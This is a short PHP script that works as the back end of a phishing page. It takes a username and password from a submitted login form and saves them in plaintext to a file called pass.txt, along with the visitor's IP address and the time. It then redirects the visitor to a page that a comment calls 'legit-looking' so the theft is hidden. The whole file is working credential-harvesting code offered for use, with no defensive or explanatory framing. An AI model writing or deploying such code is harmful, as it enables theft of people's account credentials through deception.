<?php
// Enable error reporting (for debugging)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get username and password from POST request
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Validate input
if (!empty($username) && !empty($password)) {
    // Save to pass.txt (appends new entries)
    $file = 'pass.txt';
    $data = "Username: $username | Password: $password | IP: {$_SERVER['REMOTE_ADDR']} | Time: " . date('Y-m-d H:i:s') . "\n";
    
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    
    // Redirect to a legit-looking page (e.g., password reset page)
    header('Location: https://example.com/password-reset');
    exit();
} else {
    // If empty, redirect back to login
    header('Location: login.html');
    exit();
}
?>
